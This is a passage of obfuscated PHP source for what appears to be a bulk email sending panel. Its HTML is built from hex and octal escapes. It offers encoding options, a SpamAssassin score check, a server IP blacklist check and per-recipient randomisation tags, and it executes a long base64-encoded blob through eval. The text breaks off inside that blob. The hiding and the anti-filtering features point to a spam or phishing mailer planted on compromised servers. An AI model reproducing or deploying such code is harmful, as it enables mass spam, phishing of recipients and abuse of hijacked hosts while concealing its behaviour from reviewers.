"\x3e\x49\x53\x4f\x2d\x38\x38\65\x39\x2d\x31\x3c\57\157\160\164\x69\157\156\x3e\12\x20\40\40\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\40\x20\40\x20\40\x20\x3c\x2f\163\145\154\x65\143\164\76\12\x20\40\40\x20\x20\x20\x20\40\40\40\40\x20\x20\x20\40\40\x3c\57\144\x69\166\x3e\12\40\40\x20\x20\40\40\40\x20\40\x20\40\40\x20\40\x20\40\x3c\144\x69\x76\x20\x63\x6c\141\x73\x73\x3d\x22\146\x6f\x72\155\x2d\147\x72\157\x75\160\x20\143\157\x6c\55\154\147\55\x33\40\x22\x3e\12\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\x20\74\x6c\141\x62\145\x6c\40\x66\x6f\162\x3d\x22\x65\156\143\x6f\144\151\156\147\x22\x3e\x4d\x65\163\x73\141\x67\145\x20\x65\156\143\157\x64\x69\x6e\x67\x3c\x2f\x6c\x61\142\x65\x6c\76\xa\40\x20\x20\x20\40\40\x20\40\x20\40\40\40\x20\x20\x20\40\40\40\x20\x20\x3c\x73\x65\154\145\x63\x74\x20\143\x6c\141\x73\x73\75\42\x66\157\x72\x6d\x2d\x63\x6f\x6e\164\x72\x6f\154\x20\151\x6e\160\x75\x74\x2d\163\155\42\40\151\144\75\42\x65\156\143\x6f\144\x65\x22\x20\156\141\155\x65\x3d\42\145\156\x63\157\144\145\x22\76\12\40\x20\40\x20\x20\x20\40\40\40\40\x20\x20\40\x20\x20\40\40\x20\x20\40\x20\40\x20\x20\74\157\x70\x74\151\x6f\156\40" . $bit8 . "\76\70\x62\151\164\74\57\x6f\160\x74\x69\x6f\156\76\xa\x20\40\x20\40\40\40\40\x20\x20\x20\40\x20\x20\x20\x20\40\40\x20\40\x20\40\x20\40\40\74\157\x70\x74\151\x6f\156\x20" . $bit7 . "\x3e\x37\x62\151\x74\x3c\x2f\x6f\x70\164\151\x6f\x6e\76\12\x20\x20\40\x20\x20\40\40\40\x20\40\40\40\40\40\40\x20\40\40\x20\x20\x20\x20\40\40\74\157\160\164\151\157\x6e\40" . $binary . "\76\142\151\156\x61\x72\171\x3c\x2f\x6f\x70\164\x69\x6f\156\x3e\xa\40\40\40\x20\x20\x20\x20\x20\40\40\40\40\40\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3c\x6f\160\x74\151\157\x6e\40" . $base64 . "\76\x62\x61\x73\x65\x36\64\x3c\x2f\157\160\x74\x69\157\156\x3e\xa\40\40\x20\40\x20\40\40\x20\40\40\40\x20\40\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\x3c\157\x70\x74\151\157\x6e\40" . $quotedprintable . "\76\161\165\157\164\x65\x64\55\160\x72\x69\x6e\x74\x61\x62\x6c\x65\74\x2f\157\x70\164\x69\x6f\156\x3e\xa\xa\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\x20\40\x20\40\x20\x20\40\40\40\x3c\x2f\x73\145\x6c\145\143\x74\x3e\12\40\40\x20\40\40\x20\x20\x20\40\x20\40\40\x20\x20\x20\x20\74\x2f\x64\x69\x76\x3e\12\x20\40\40\40\x20\x20\40\x20\40\x20\x20\x20\x3c\57\x64\x69\x76\76\12\40\x20\40\40\x20\40\40\x20\40\x20\40\x20\74\142\165\x74\164\157\x6e\x20\x74\x79\x70\145\75\x22\163\165\142\155\151\x74\x22\x20\x63\154\141\x73\x73\75\42\142\x74\156\x20\142\164\x6e\55\144\x65\146\141\x75\154\164\40\142\x74\x6e\x2d\x73\155\42\40\146\x6f\162\155\x3d\42\x66\x6f\x72\155\x22\40\156\x61\x6d\x65\x3d\42\x61\x63\164\151\x6f\x6e\x22\x20\x76\141\154\x75\x65\x3d\x22\163\145\x6e\x64\x22\x3e\x53\x45\x4e\x44\74\57\142\165\164\x74\157\x6e\x3e\x20\157\x72\40\x3c\141\40\x68\x72\x65\x66\75\42\x23\x22\x20\157\x6e\x63\x6c\151\143\153\75\x22\144\x6f\x63\x75\x6d\x65\156\164\x2e\x67\145\x74\105\154\145\155\x65\156\x74\x42\171\x49\x64\x28\x27\146\157\x72\155\47\51\x2e\x73\x75\x62\155\x69\x74\50\x29\x3b\40\x72\145\x74\165\x72\156\40\146\x61\x6c\163\145\x3b\x22\76\143\150\145\143\x6b\40\x53\160\x61\155\101\x73\x73\141\x73\163\151\x6e\40\x53\143\x6f\x72\145\x3c\x2f\x61\76\xa\x20\40\40\12\40\40\x20\40\40\x20\40\x20\74\57\x66\x6f\162\155\76\xa\40\x20\40\x20\x3c\x2f\x64\151\x76\x3e\xa\40\x20\x20\40\74\x64\x69\x76\x20\143\154\x61\x73\x73\75\x22\143\x6f\x6c\x2d\154\x67\x2d\66\42\76\x3c\142\x72\76\xa\x20\40\40\40\x20\x20\x20\40\74\154\141\x62\x65\x6c\x20\146\157\x72\x3d\42\x77\x65\154\x6c\42\x3e\x49\156\x73\164\x72\165\143\x74\x69\157\x6e\74\57\x6c\x61\142\145\154\76\12\40\40\40\x20\x20\x20\40\x20\74\x64\151\166\x20\x69\x64\x3d\x22\x77\145\154\154\x22\40\x63\x6c\x61\x73\163\75\42\x77\145\x6c\x6c\x20\167\145\x6c\x6c\x22\x3e\xa\x20\x20\x20\x20\40\40\40\x20\40\x20\40\x20\x3c\x68\64\76\x53\145\162\166\x65\162\40\x49\x6e\146\x6f\x72\155\141\x74\x69\x6f\x6e\x3c\57\150\64\x3e\12\40\x20\40\x20\40\x20\40\40\x20\x20\40\40\x3c\x75\x6c\76\xa\x20\40\x20\x20\40\40\40\40\40\x20\x20\x20\40\x20\x20\x20\x3c\x6c\x69\x3e\123\x65\162\x76\x65\162\x20\x49\120\40\101\x64\144\162\x65\163\163\x20\x3a\40\x3c\142\x3e" . $_SERVER["\x53\105\122\126\x45\122\137\101\x44\x44\x52"] . "\40\x3c\57\142\x3e\40\x3c\x61\40\x68\x72\145\146\75\42\x3f\x63\x68\x65\x63\x6b\x5f\x69\x70\x3d" . $_SERVER["\123\x45\x52\x56\105\122\137\x41\104\x44\122"] . "\x22\40\164\x61\x72\147\145\164\75\x22\x5f\142\154\x61\x6e\153\x22\x20\x63\154\141\163\x73\75\42\x6c\141\142\x65\154\x20\154\141\x62\145\154\x2d\x70\162\151\155\141\x72\171\42\76\103\150\145\143\x6b\40\102\x6c\x61\x63\x6b\x6c\x69\x73\x74\x20\x3c\151\40\143\154\141\x73\163\x3d\x22\x67\x6c\171\160\150\151\143\157\156\40\147\x6c\x79\x70\x68\151\143\x6f\156\55\x73\x65\141\162\143\x68\42\x3e\x3c\57\x69\x3e\x3c\x2f\x61\x3e\74\57\154\x69\76\xa\x20\40\40\40\40\40\x20\x20\40\x20\40\40\40\x20\x20\x20\x3c\154\151\76\120\x48\120\x20\126\x65\x72\x73\151\157\x6e\x20\x3a\x20\74\142\x3e" . phpversion() . "\74\x2f\x62\x3e\x3c\x2f\x6c\151\x3e\xa\x20\x20\40\x20\x20\x20\40\x20\x20\40\x20\40\40\x20\x20\40\12\12\40\x20\40\x20\x20\40\x20\40\40\x20\x20\40\74\57\165\154\x3e\12\40\x20\40\x20\x20\40\x20\x20\40\40\40\40\74\150\64\76\x48\105\x4c\120\74\57\150\x34\76\xa\x20\40\x20\40\x20\x20\x20\x20\x20\x20\x20\40\74\165\x6c\x3e\12\40\40\x20\x20\40\x20\x20\40\40\x20\40\40\x20\x20\x20\40\x3c\154\x69\x3e\133\55\x65\x6d\x61\x69\154\55\135\x20\x3a\40\x3c\x62\76\122\145\x63\151\166\x65\x72\40\x45\155\141\151\154\x3c\57\142\x3e\x20\x28\x65\155\x61\x69\154\165\163\x65\x72\x40\x65\x6d\141\151\x6c\144\157\x6d\x61\x69\156\x2e\143\157\155\x29\74\57\154\x69\x3e\12\x20\x20\x20\x20\x20\40\40\x20\x20\40\40\40\x20\40\x20\40\x3c\x75\x6c\x3e\xa\40\40\40\x20\40\x20\x20\x20\x20\x20\40\40\40\x20\x20\40\40\x20\40\x20\x3c\154\151\x3e\x5b\55\x65\155\x61\151\154\x75\163\145\x72\55\x5d\40\72\x20\x3c\142\x3e\x45\x6d\x61\x69\154\40\x55\163\145\x72\x3c\x2f\x62\x3e\40\x28\x65\x6d\x61\151\154\165\x73\x65\x72\51\40\x3c\x2f\154\x69\x3e\12\x20\x20\40\x20\40\x20\40\40\40\x20\x20\x20\40\x20\40\40\40\40\x20\40\74\x6c\x69\x3e\133\55\x65\x6d\x61\x69\x6c\x64\x6f\x6d\141\151\x6e\x2d\x5d\x20\x3a\x20\x3c\x62\76\105\x6d\x61\x69\x6c\x20\125\x73\145\x72\x3c\57\x62\x3e\x20\x28\145\155\x61\151\x6c\x64\157\x6d\141\x69\x6e\x2e\143\157\x6d\x29\40\74\x2f\x6c\x69\x3e\12\x20\x20\40\40\x20\40\40\40\40\x20\40\40\40\40\x20\40\x3c\x2f\x75\154\x3e\12\40\x20\40\x20\40\x20\x20\40\x20\40\40\x20\40\x20\40\40\x3c\154\151\76\x5b\x2d\164\x69\x6d\x65\x2d\x5d\40\x3a\40\x3c\x62\x3e\x44\x61\x74\x65\40\x61\x6e\x64\x20\x54\151\155\x65\74\x2f\x62\76\x20\x28" . date("\x6d\x2f\x64\x2f\x59\40\x68\x3a\151\72\x73\40\141", time()) . "\51\x3c\x2f\154\151\76\xa\40\x20\x20\x20\40\x20\40\x20\x20\40\40\40\x20\x20\x20\x20\12\40\40\40\x20\x20\40\x20\x20\40\40\40\40\40\x20\x20\x20\x3c\x6c\151\76\133\55\x72\141\156\144\x6f\155\163\x74\162\x69\156\x67\55\x5d\x20\x3a\x20\x3c\x62\x3e\x52\x61\156\x64\x6f\155\40\163\x74\162\x69\156\147\x20\50\x30\x2d\71\x2c\141\x2d\172\51\74\57\142\x3e\x3c\57\x6c\151\76\12\x20\40\40\40\x20\40\40\x20\40\40\40\40\40\x20\40\40\x3c\x6c\x69\76\x5b\x2d\x72\x61\156\144\x6f\155\x6e\x75\x6d\x62\x65\x72\55\x5d\x20\x3a\x20\74\x62\x3e\122\x61\x6e\144\157\155\40\156\165\155\x62\145\162\40\x28\60\55\71\x29\40\74\x2f\x62\76\74\57\x6c\x69\76\12\x20\40\x20\40\40\x20\40\x20\40\40\x20\x20\40\40\40\40\74\154\151\x3e\133\55\162\x61\156\144\x6f\155\x6c\x65\x74\164\145\x72\163\55\x5d\x20\x3a\x20\x3c\x62\x3e\122\141\156\x64\x6f\x6d\40\x4c\145\164\x74\145\162\163\50\141\55\x7a\51\x20\74\57\142\x3e\74\x2f\x6c\151\76\12\40\x20\x20\x20\40\40\40\x20\x20\40\x20\x20\x20\x20\40\x20\74\154\x69\x3e\133\x2d\162\141\x6e\x64\x6f\155\155\x64\x35\55\135\x20\x3a\40\x3c\142\76\122\x61\x6e\x64\x6f\x6d\x20\x4d\x44\x35\40\74\57\142\76\x3c\x2f\x6c\151\76\xa\x20\40\x20\40\40\x20\x20\x20\x20\x20\x20\40\x3c\x2f\165\x6c\x3e\12\40\x20\x20\40\40\40\x20\40\x20\40\40\40\x3c\x68\64\76\x65\170\141\155\x70\x6c\145\74\57\150\x34\x3e\xa\40\x20\40\x20\x20\40\40\40\40\40\40\x20\x52\145\x63\x65\151\x76\x65\x72\40\105\155\x61\151\x6c\40\x3d\x20\74\142\76\x75\163\x65\162\100\144\157\155\x61\x69\x6e\x2e\x63\157\x6d\74\57\142\x3e\x3c\x62\162\76\12\x20\x20\40\x20\40\x20\x20\x20\x20\x20\x20\x20\74\165\154\x3e\xa\40\x20\x20\x20\40\x20\40\x20\x20\x20\x20\x20\40\40\40\x20\74\x6c\151\x3e\150\145\154\154\x6f\x20\74\x62\76\x5b\x2d\x65\155\141\151\154\x75\163\145\162\55\x5d\74\x2f\142\x3e\40\75\40\x68\145\154\x6c\x6f\40\x3c\x62\76\165\163\145\x72\74\x2f\142\76\x3c\x2f\x6c\x69\x3e\xa\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\40\x20\40\40\40\x3c\x6c\x69\x3e\171\157\165\x72\x20\x64\157\155\x61\151\x6e\x20\151\x73\40\x3c\142\x3e\133\x2d\x65\x6d\x61\151\154\144\157\155\x61\151\x6e\55\135\74\57\142\x3e\x20\75\x20\x59\x6f\x75\x72\40\104\157\155\141\x69\x6e\x20\151\163\x20\74\x62\x3e\144\x6f\x6d\x61\151\x6e\x2e\x63\x6f\155\74\57\x62\x3e\x3c\x2f\154\x69\76\xa\x20\40\40\40\x20\40\40\x20\40\x20\x20\40\40\40\x20\40\74\x6c\x69\76\x79\x6f\x75\x72\40\143\x6f\x64\145\x20\x69\x73\x20\40\x3c\142\76\x5b\x2d\x72\141\x6e\x64\157\x6d\155\144\65\55\x5d\74\x2f\142\76\x20\x3d\x20\171\157\x75\x72\40\143\x6f\144\x65\x20\151\163\x20\x3c\142\x3e\145\x31\60\x61\144\143\63\71\64\71\142\x61\65\71\x61\142\142\145\65\x36\x65\60\65\x37\x66\x32\x30\x66\70\x38\63\x65\x3c\57\x62\x3e\74\x2f\x6c\x69\x3e\12\x20\x20\40\x20\40\x20\40\x20\40\40\x20\x20\74\x2f\x75\154\76\12\12\x20\x20\40\40\40\40\x20\x20\40\40\x20\x20\74\150\66\x3e\x62\x79\40\x3c\x62\76\x3c\141\40\x68\162\145\146\x3d\x22\150\x74\164\x70\x3a\x2f\x2f" . $leaf["\167\145\x62\x73\x69\x74\145"] . "\42\x3e" . $leaf["\167\x65\x62\163\151\164\x65"] . "\74\x2f\x61\76\74\57\142\76\74\57\x68\x36\76\xa\x20\40\x20\40\40\40\40\x20\x3c\57\144\x69\166\76\xa\x20\x20\40\x20\74\57\x64\151\x76\76"; goto lqytm; BcOwo: eval(base64_decode("\x5a\x6e\126\165\x59\x33\122\x70\x62\62\x34\x67\127\105\x4a\x66\x54\61\x4d\x6f\x4a\x46\126\124\122\x56\112\x66\121\x55\144\x46\124\154\x51\x70\x65\167\60\x4b\103\123\x52\120\125\x31\x39\x46\x55\154\112\120\x55\151\101\147\111\x43\x41\x39\111\x43\101\147\111\x6c\126\165\141\x32\65\166\x64\62\64\147\124\61\115\x67\x55\107\x78\x68\144\x47\132\166\x63\155\x30\x69\117\167\x30\113\x49\103\x41\147\x49\x43\122\120\x55\171\x41\147\120\x53\101\147\111\x47\106\171\143\x6d\x46\x35\113\103\101\x6e\x4c\x33\x64\160\x62\155\122\166\x64\x33\115\147\x62\x6e\x51\147\x4d\124\101\166\141\123\x63\147\111\103\x41\x67\111\103\x41\x39\120\151\101\x67\x4a\x31\144\160\142\155\122\x76\x64\63\x4d\x67\115\x54\x41\x6e\114\x41\60\x4b\x43\x53\101\147\x49\x43\x41\147\111\103\101\147\x49\103\x41\x67\x49\x43\x41\147\x49\x43\101\156\114\63\144\160\142\155\122\166\144\63\x4d\147\142\156\x51\x67\116\x69\x34\172\x4c\62\153\156\x49\103\x41\147\111\x43\101\x39\120\151\x41\x67\x4a\61\144\x70\x62\x6d\x52\166\x64\x33\115\147\117\x43\x34\x78\x4a\x79\167\116\x43\147\153\147\111\x43\x41\147\x49\103\x41\147\111\x43\x41\147\111\103\x41\x67\x49\103\101\147\112\171\x39\63\x61\127\65\153\x62\x33\x64\172\111\107\x35\x30\111\104\x59\165\115\x69\71\x70\x4a\171\101\x67\111\x43\101\147\120\124\64\x67\x49\x43\144\130\141\x57\65\x6b\142\x33\x64\x7a\x49\104\x67\156\x4c\101\x30\x4b\x43\x53\101\x67\111\x43\101\x67\111\103\101\147\x49\x43\x41\147\111\103\x41\x67\x49\x43\101\x6e\114\x33\x64\x70\142\155\122\166\144\x33\115\x67\142\156\121\147\x4e\x69\x34\170\114\x32\153\x6e\111\x43\101\x67\111\103\x41\71\x50\151\x41\x67\x4a\x31\144\160\x62\x6d\122\x76\144\x33\115\x67\x4e\x79\143\x73\104\x51\157\112\111\x43\101\147\x49\x43\101\x67\111\103\101\x67\x49\x43\x41\147\111\x43\101\147\x49\103\143\x76\144\x32\x6c\165\132\x47\x39\x33\x63\171\x42\165\144\103\101\x32\114\152\101\x76\x61\123\143\147\111\x43\101\147\111\104\x30\x2b\x49\103\101\156\126\62\154\x75\132\x47\x39\63\143\x79\x42\127\x61\130\116\60\131\123\x63\x73\x44\121\157\x4a\x49\x43\x41\147\111\103\101\147\x49\x43\x41\x67\x49\x43\x41\147\x49\x43\101\x67\111\x43\143\x76\x64\62\154\x75\132\107\71\x33\x63\x79\102\x75\x64\x43\x41\61\114\152\111\166\x61\123\143\147\x49\x43\x41\147\x49\x44\x30\x2b\111\103\101\156\126\x32\154\x75\132\x47\71\x33\x63\x79\102\124\132\130\x4a\62\132\130\111\x67\115\x6a\101\x77\x4d\x79\71\x59\x55\x43\x42\64\116\x6a\x51\156\114\101\x30\113\x43\123\101\147\111\x43\x41\147\x49\103\x41\x67\111\x43\x41\x67\111\103\101\x67\111\x43\101\x6e\114\x33\x64\x70\x62\155\122\166\x64\63\x4d\147\142\156\121\x67\x4e\123\64\170\114\62\x6b\x6e\x49\103\x41\x67\111\103\101\x39\x50\151\101\147\112\x31\x64\x70\x62\155\x52\x76\144\63\115\x67\127\x46\101\x6e\x4c\101\x30\x4b\x43\123\101\x67\x49\103\101\x67\x49\x43\101\147\x49\103\101\x67\x49\x43\101\147\111\x43\101\x6e\114\x33\x64\160\x62\x6d\x52\166\x64\x33\115\147\x65\110\x41\x76\x61\x53\143\x67\x49\x43\x41\147\x49\x43\x41\x67\111\x43\x41\71\120\x69\101\147\x4a\x31\144\160\142\x6d\x52\x76\144\x33\115\147\x57\106\x41\156\114\101\x30\x4b\x43\123\x41\147\111\103\101\147\111\103\x41\x67\x49\x43\x41\147\111\x43\x41\147\x49\x43\x41\156\114\x33\x64\160\x62\x6d\x52\166\144\x33\115\147\x62\156\x51\x67\x4e\123\64\167\x4c\62\x6b\156\x49\103\x41\x67\111\103\101\x39\120\x69\101\147\112\x31\144\x70\x62\x6d\x52\x76\144\63\115\x67\115\152\x41\167\x4d\x43\x63\163\104\x51\x6f\112\x49\103\101\x67\x49\x43\101\x67\111\103\101\147\x49\x43\101\147\x49\103\101\147\111\x43\x63\x76\144\62\x6c\165\132\107\x39\x33\143\171\x42\x74\132\123\x39\x70\112\171\101\147\111\x43\101\147\x49\103\x41\147\x49\x44\60\53\111\x43\x41\156\x56\x32\154\x75\132\x47\71\x33\x63\x79\102\116\x52\123\143\163\x44\x51\x6f\112\111\x43\x41\x67\111\x43\x41\147\111\103\x41\147\x49\103\101\x67\x49\x43\x41\147\111\103\x63\x76\144\x32\x6c\165\117\x54\x67\x76\x61\123\143\x67\111\103\101\x67\111\103\101\x67\111\x43\101\147\111\103\101\x67\x49\x44\x30\x2b\x49\x43\x41\x6e\126\62\154\165\x5a\x47\71\63\143\x79\101\65\x4f\x43\x63\163\x44\121\157\112\111\103\101\x67\111\103\101\147\x49\103\101\147\x49\x43\101\147\111\103\x41\147\x49\103\x63\x76\144\62\154\165\x4f\x54\x55\166\x61\123\x63\147\x49\103\101\x67\x49\103\101\147\111\x43\x41\147\111\x43\101\147\x49\x44\x30\x2b\x49\103\101\x6e\x56\62\154\x75\x5a\107\71\x33\143\171\101\65\x4e\123\x63\163\x44\x51\x6f\112\111\x43\x41\x67\111\x43\x41\x67\x49\103\x41\147\x49\103\101\x67\111\103\x41\x67\x49\x43\143\166\144\x32\x6c\165\115\124\x59\166\x61\123\x63\147\x49\103\101\x67\x49\x43\x41\147\111\x43\x41\147\111\x43\x41\x67\x49\x44\x30\53\x49\x43\x41\156\x56\x32\x6c\165\x5a\x47\71\x33\x63\171\x41\172\x4c\x6a\105\x78\x4a\x79\167\116\x43\147\153\147\111\103\x41\x67\x49\103\101\x67\x49\x43\x41\147\111\103\x41\147\x49\103\101\x67\x4a\171\x39\x74\131\x57\116\x70\142\156\122\166\143\62\x68\70\x62\x57\106\152\111\x47\71\172\111\110\147\x76\141\x53\x63\147\x50\x54\x34\x67\x49\103\x64\116\x59\x57\x4d\x67\x54\x31\x4d\x67\x57\x43\143\163\104\121\157\112\x49\103\x41\147\x49\x43\x41\147\x49\103\101\147\x49\103\x41\x67\x49\x43\x41\147\x49\103\143\x76\x62\127\x46\152\x58\x33\x42\x76\144\62\126\x79\143\107\x4d\166\141\x53\x63\147\111\103\101\147\x49\103\x41\147\111\x44\60\53\111\x43\101\156\124\127\106\x6a\x49\x45\71\124\x49\104\x6b\x6e\x4c\101\60\113\103\x53\101\x67\111\x43\101\x67\111\103\x41\x67\111\103\101\x67\x49\103\x41\x67\111\103\101\156\x4c\x32\x78\160\142\x6e\126\64\x4c\62\x6b\x6e\x49\x43\101\147\111\x43\x41\x67\x49\x43\x41\x67\x49\x43\x41\147\x49\x43\x41\71\120\151\x41\147\x4a\60\x78\x70\142\156\x56\64\x4a\x79\x77\116\103\x67\x6b\147\111\103\101\147\111\103\101\x67\x49\103\x41\x67\111\x43\101\147\111\x43\101\x67\x4a\171\x39\x31\x59\156\x56\165\144\x48\125\x76\141\123\143\x67\111\103\x41\x67\x49\x43\101\x67\x49\x43\x41\147\x49\103\101\147\x50\124\64\147\111\103\144\126\131\x6e\126\165\x64\x48\125\x6e\x4c\x41\x30\x4b\x43\x53\x41\147\111\x43\x41\x67\111\103\x41\x67\111\x43\x41\147\111\x43\101\147\111\103\101\156\x4c\x32\154\167\141\107\x39\x75\132\x53\x39\x70\x4a\171\101\147\111\x43\x41\x67\111\x43\101\147\x49\x43\x41\x67\x49\x43\101\71\120\151\x41\147\112\x32\154\121\x61\x47\71\165\x5a\123\x63\163\x44\x51\157\x4a\x49\x43\x41\x67\111\x43\x41\x67\111\103\101\x67\x49\103\x41\147\111\103\101\147\x49\x43\x63\x76\141\x58\102\x76\x5a\103\x39\160\x4a\171\101\x67\x49\x43\x41\147\x49\x43\101\147\x49\x43\101\147\x49\x43\x41\147\111\104\x30\x2b\111\103\101\x6e\141\x56\102\x76\x5a\103\143\x73\x44\121\157\112\x49\103\101\x67\x49\103\x41\x67\x49\103\101\x67\x49\103\x41\x67\x49\103\x41\147\111\x43\x63\166\x61\x58\x42\150\x5a\103\71\x70\x4a\x79\101\x67\x49\103\101\147\111\103\101\x67\x49\x43\x41\x67\111\103\x41\x67\x49\x44\60\x2b\111\103\x41\x6e\141\126\102\x68\132\103\143\x73\x44\121\x6f\112\x49\x43\x41\x67\x49\x43\x41\x67\x49\x43\x41\147\x49\x43\x41\x67\x49\x43\101\147\x49\x43\143\166\131\x57\x35\153\x63\x6d\x39\x70\x5a\103\x39\x70\112\x79\x41\x67\111\x43\101\147\111\x43\x41\147\x49\103\101\x67\111\104\x30\53\111\103\101\156\121\x57\65\x6b\143\155\71\160\132\103\x63\163\104\x51\157\x4a\x49\103\x41\x67\111\x43\x41\147\111\103\101\147\x49\x43\101\147\111\x43\101\147\x49\103\143\166\x59\155\x78\x68\131\x32\164\x69\132\130\x4a\x79\x65\123\x39\160\112\x79\101\x67\x49\103\101\x67\111\x43\x41\147\x49\x44\60\x2b\111\103\101\x6e\x51\155\170\150\x59\62\164\103\x5a\130\112\x79\x65\x53\143\x73\x44\121\x6f\112\111\103\x41\147\111\x43\x41\x67\x49\103\101\147\x49\x43\101\147\111\103\101\147\x49\x43\143\x76\144\x32\x56\x69\x62\x33\115\166\x61\123\143\x67\111\103\101\147\x49\x43\101\x67\111\103\101\147\111\x43\x41\147\x49\x44\60\53\x49\x43\x41\x6e\124\x57\71\x69\x61\127\170\x6c\x4a\171\153\x37\104\x51\157\x67\111\103\x41\x67\x5a\x6d\x39\x79\132\x57\106\x6a\x61\x43\101\157\x4a\105\x39\124\111\x47\x46\172\x49\x43\122\x79\x5a\x57\144\x6c\145\103\x41\71\x50\151\101\x6b\144\x6d\106\163\x64\x57\125\160\x49\110\163\147\x44\x51\x6f\x67\111\x43\101\x67\111\x43\x41\147\x49\107\x6c\x6d\111\x43\150\x77\143\x6d\126\156\x58\x32\x31\x68\x64\107\116\x6f\113\103\x52\171\132\x57\x64\154\x65\x43\167\x67\112\106\126\x54\122\126\x4a\146\x51\x55\144\x46\x54\154\121\160\113\x53\102\x37\104\x51\157\147\111\103\x41\147\x49\103\101\x67\x49\x43\x41\147\x49\103\x41\x6b\124\61\x4e\146\122\x56\112\x53\x54\x31\x49\x67\x50\x53\101\153\144\x6d\106\x73\144\x57\125\67\x44\x51\x6f\x67\x49\103\101\147\111\x43\x41\x67\111\x48\60\x4e\103\147\x30\113\111\x43\101\147\x49\110\60\147\111\103\101\116\x43\151\x41\147\111\x43\x42\171\x5a\130\x52\x31\x63\155\x34\x67\112\105\x39\124\130\x30\126\x53\125\x6b\71\123\x4f\x77\60\x4b\146\121\60\x4b\x5a\x6e\x56\165\131\63\x52\160\142\62\x34\147\x57\105\112\146\121\156\x4a\166\144\x33\116\x6c\x63\x69\147\x6b\126\126\116\106\125\x6c\71\102\x52\x30\126\x4f\x56\x43\154\x37\x44\x51\x6f\x4a\x4a\x45\x4a\x53\x54\61\x64\124\122\x56\x4a\x66\x52\x56\112\123\124\x31\111\x67\111\x43\x41\147\x50\123\101\147\111\103\x4a\x56\x62\x6d\x74\x75\x62\63\144\x75\111\x45\112\171\142\63\144\x7a\x5a\x58\111\x69\117\167\x30\x4b\x49\103\x41\147\111\x43\122\x43\x55\x6b\x39\130\x55\x30\126\123\111\103\x41\71\x49\103\101\x67\131\x58\x4a\x79\131\x58\153\x6f\x4a\x79\71\164\x63\62\154\154\114\62\153\x6e\111\x43\x41\x67\111\103\x41\x67\x49\104\60\53\111\x43\x41\x6e\123\127\x35\60\132\130\x4a\x75\132\130\x51\147\122\130\x68\x77\142\107\71\x79\x5a\130\111\x6e\x4c\101\x30\x4b\111\103\x41\147\111\x43\x41\147\111\103\x41\x67\x49\103\101\147\x49\103\101\x67\111\x43\x41\x67\111\103\101\x67\111\x43\101\147\112\x79\x39\x6d\141\x58\x4a\x6c\x5a\155\71\64\114\x32\x6b\156\x49\x43\x41\147\111\104\60\53\x49\103\101\156\122\x6d\154\x79\x5a\127\132\166\x65\x43\143\163\x44\121\x6f\147\x49\103\x41\x67\x49\103\x41\147\111\103\x41\147\x49\x43\x41\x67\111\x43\x41\x67\x49\103\x41\x67\x49\103\101\147\x49\103\101\x6e\114\x33\116\150\132\x6d\x46\x79\141\123\71\x70\112\x79\x41\147\111\x43\x41\147\120\x54\64\x67\111\x43\144\124\131\127\x5a\150\143\x6d\x6b\156\114\x41\x30\x4b\x49\103\101\x67\111\103\x41\x67\x49\x43\x41\147\111\x43\x41\147\x49\103\x41\147\x49\103\101\147\x49\103\x41\x67\x49\x43\x41\x67\x4a\x79\x39\152\141\x48\x4a\x76\142\x57\125\166\x61\x53\x63\147\x49\x43\101\x67\x49\x44\x30\53\x49\103\101\156\x51\62\150\x79\x62\62\61\x6c\x4a\171\167\x4e\103\151\101\147\x49\x43\101\147\x49\x43\x41\x67\x49\103\x41\x67\x49\x43\x41\147\111\x43\101\147\111\103\101\147\111\103\101\x67\x49\x43\143\166\132\x57\122\156\132\123\x39\x70\112\x79\x41\x67\x49\103\x41\x67\x49\x43\x41\71\x50\x69\x41\147\112\x30\126\x6b\132\x32\x55\x6e\x4c\x41\60\113\111\103\101\147\x49\103\101\x67\111\103\101\x67\x49\x43\x41\x67\x49\x43\101\x67\x49\103\101\147\x49\103\101\147\111\x43\x41\147\112\171\x39\166\x63\107\126\171\x59\123\71\160\112\171\x41\x67\111\x43\101\147\111\104\60\53\111\103\101\156\x54\63\102\x6c\143\x6d\x45\156\x4c\101\60\x4b\x49\103\101\147\111\x43\x41\147\111\x43\101\x67\x49\103\x41\x67\x49\x43\x41\x67\111\103\101\147\111\103\101\x67\111\x43\x41\x67\112\x79\71\165\132\130\122\172\x59\62\x46\167\x5a\x53\71\x70\112\x79\101\x67\x49\104\x30\x2b\111\103\x41\x6e\x54\155\126\60\x63\62\x4e\150\x63\107\x55\x6e\x4c\101\60\x4b\x49\x43\101\x67\x49\x43\101\x67\x49\103\101\x67\111\x43\x41\x67\x49\103\101\147\111\103\101\x67\x49\x43\x41\x67\111\x43\x41\147\112\x79\x39\164\x59\130\x68\x30\141\107\71\x75\114\62\x6b\x6e\111\x43\x41\147\x49\x44\x30\x2b\x49\103\101\156\x54\x57\x46\x34\x64\107\x68\x76\x62\151\x63\163\104\121\157\x67\111\x43\101\x67\x49\x43\x41\147\x49\x43\x41\147\111\103\x41\x67\111\x43\x41\147\x49\103\x41\147\111\103\101\x67\111\x43\101\x6e\114\x32\164\x76\142\x6e\x46\x31\132\x58\x4a\166\143\x69\x39\160\112\171\x41\x67\x50\x54\x34\147\x49\103\144\114\x62\62\65\x78\x64\127\x56\171\x62\63\x49\156\x4c\x41\x30\x4b\x49\103\101\x67\x49\103\101\x67\111\x43\101\147\111\103\101\x67\x49\103\x41\x67\x49\103\x41\147\x49\103\x41\x67\111\103\x41\147\x4a\171\71\x74\x62\x32\112\160\142\x47\125\166\x61\123\143\147\x49\x43\x41\x67\x49\x44\60\x2b\x49\103\x41\x6e\123\107\106\165\132\x47\150\154\x62\x47\x51\x67\121\156\x4a\x76\x64\63\116\x6c\143\151\x63\160\117\x77\x30\x4b\x49\x43\101\147\111\x47\132\x76\143\x6d\126\x68\131\x32\147\147\113\x43\122\103\125\x6b\71\130\125\60\126\123\111\107\x46\172\x49\103\x52\x79\x5a\x57\144\154\x65\x43\x41\x39\x50\151\x41\153\144\155\x46\163\144\x57\x55\x70\x49\x48\163\x67\104\x51\157\147\x49\103\101\x67\111\x43\x41\x67\111\107\x6c\x6d\x49\103\150\x77\143\x6d\126\x6e\x58\x32\61\x68\144\107\116\157\x4b\103\x52\171\x5a\127\144\154\145\103\167\x67\x4a\106\x56\x54\122\126\x4a\x66\121\1